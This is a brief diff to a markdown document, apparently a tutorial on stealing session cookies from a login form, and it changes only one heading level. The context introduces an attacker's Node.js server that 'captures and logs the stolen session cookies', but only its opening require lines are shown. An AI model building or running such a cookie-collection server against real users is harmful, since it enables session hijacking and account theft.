@@ -108,7 +108,7 @@ document.getElementById("loginForm").addEventListener("submit", function() {
 ### 📌 Attacker’s Server (attacker.js)
 This script captures and logs the stolen session cookies.
 
-###🔹 Inside attacker.js
+####🔹 Inside attacker.js
 ```js
 const express = require('express');
 const fs = require('fs');
